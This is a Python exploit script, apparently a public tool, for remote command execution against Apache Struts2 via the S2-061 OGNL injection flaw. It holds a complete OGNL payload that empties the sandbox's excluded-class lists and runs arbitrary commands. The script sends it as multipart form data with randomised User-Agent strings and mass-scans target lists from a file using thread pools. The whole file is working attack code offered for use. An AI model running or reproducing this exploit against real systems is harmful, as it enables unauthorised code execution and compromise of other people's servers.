#-*- coding:utf-8 -*-
banner = """
        888888ba             dP                     
        88    `8b            88                     
       a88aaaa8P' .d8888b. d8888P .d8888b. dP    dP 
        88   `8b. 88'  `88   88   Y8ooooo. 88    88 
        88    .88 88.  .88   88         88 88.  .88 
        88888888P `88888P8   dP   `88888P' `88888P' 
   ooooooooooooooooooooooooooooooooooooooooooooooooooooo 
                @time:2020/12/22 Struts2_061_exp.py
                C0de by NebulabdSec - @batsu                  
 """
print(banner)
import threadpool
import random
import requests
import argparse
import http.client
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

payload  = '''%{{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("{}")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}}'''
TARGET_URI = "/console/css/%252e%252e%252fconsole.portal"

def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)', '(X11; Linux x86_64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua
def Struts_061(targetUrl, cmd):
    # proxies = {"http":"http://127.0.0.1:8080"}
    proxies = {"scoks5": "http://127.0.0.1:8080"}
    headers = {
        'User-Agent': get_ua(),
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF"
    }
    payload_CMD = {"id": payload.format(cmd)}
    data = urllib3.encode_multipart_formdata(payload_CMD, boundary='----WebKitFormBoundaryl7d1B1aGsV2wcZwF')
    try:
        res = requests.post(targetUrl,
                            data=data[0],
                            headers=headers,
                            timeout=15,
                            verify=False,
                            proxies=proxies)
                            # proxies={'socks5': 'http://127.0.0.1:1081'})
        requests_data = "".join(re.compile(r'id\=\"(.*?)\"',re.DOTALL).findall(res.text))
        if requests_data is not None:
            print("[+] URL:{}".format(targetUrl))
            print("[+] Command success result: " + requests_data + "\n")
        else:
            print("[-] " + targetUrl + " 没有发现Strus_061漏洞.\n")
    except:
        print('报错了')
def multithreading(cmd,filename="ip.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")] + [cmd]
            # func_params = [i] + [cmd]
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(Struts_061, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u",
                        "--url",
                        help="Target URL; Example:http://ip:port")
    parser.add_argument("-f",
                        "--file",
                        help="Url File; Example:url.txt")
    parser.add_argument("-c", "--cmd", help="Commands to be executed; ")
    args = parser.parse_args()
    url = args.url
    cmd = args.cmd
    file_path = args.file
    if url != None and file_path ==None and cmd!= None:
        Struts_061(url, cmd)
    elif url == None and file_path != None and cmd!=None:
        multithreading(cmd, file_path, 10)  # 默认15线程

if __name__ == "__main__":
    main()
